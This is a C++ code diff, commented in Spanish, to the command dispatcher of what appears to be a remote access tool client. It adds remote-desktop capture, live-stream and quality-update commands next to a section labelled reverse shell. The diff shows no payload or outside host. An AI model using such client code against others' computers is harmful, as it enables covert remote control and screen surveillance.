@@ -557,6 +557,7 @@ void Cliente::ProcesarComando(char* const& pBuffer, int iSize) {
     }
     //#####################################################
 
+
     //#####################################################
     //#####################################################
     //                REVERSE SHELL                       # 
@@ -591,8 +592,12 @@ void Cliente::ProcesarComando(char* const& pBuffer, int iSize) {
         }
         return;
     }
+    //#####################################################
 
-    //Escritorio Remoto
+
+    //#####################################################
+    //#####################################################
+    //                ESCRITORIO REMOTO                   # 
     //Single
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::RD_Single) {
         //Enviar solo una captura
@@ -603,7 +608,7 @@ void Cliente::ProcesarComando(char* const& pBuffer, int iSize) {
         if (this->mod_RemoteDesk && !this->mod_RemoteDesk->m_isRunning()) {
             strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
             if (strIn.size() == 2) {
-                int iQuality = atoi(strIn[1].c_str());
+                ULONG iQuality = static_cast<ULONG>(atoi(strIn[1].c_str()));
                 
                 std::vector<BYTE> vcDeskBuffer = this->mod_RemoteDesk->getFrameBytes(iQuality);
                 int iBufferSize = vcDeskBuffer.size();
@@ -630,6 +635,7 @@ void Cliente::ProcesarComando(char* const& pBuffer, int iSize) {
         return;
     }
 
+    //Iniciar live
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::RD_Start) {
         if (!this->mod_RemoteDesk) {
             this->mod_RemoteDesk = new mod_RemoteDesktop();
@@ -644,6 +650,7 @@ void Cliente::ProcesarComando(char* const& pBuffer, int iSize) {
         return;
     }
 
+    //Detener live
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::RD_Stop) {
         if (!this->mod_RemoteDesk) {
             DebugPrint("No se ha iniciado el objeto de remote_Desktop");
@@ -651,6 +658,18 @@ void Cliente::ProcesarComando(char* const& pBuffer, int iSize) {
         }
         this->mod_RemoteDesk->DetenerLive();
         return;
+    }
+
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::RD_Update_Q) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
+        if (strIn.size() == 2) {
+            if (this->mod_RemoteDesk) {
+                ULONG uQuality = static_cast<ULONG>(atoi(strIn[1].c_str()));
+                this->mod_RemoteDesk->m_UpdateQuality(uQuality);
+            }else {
+                DebugPrint("[RD]No se ha creado el objeto");
+            }
+        }
     }
 
 }
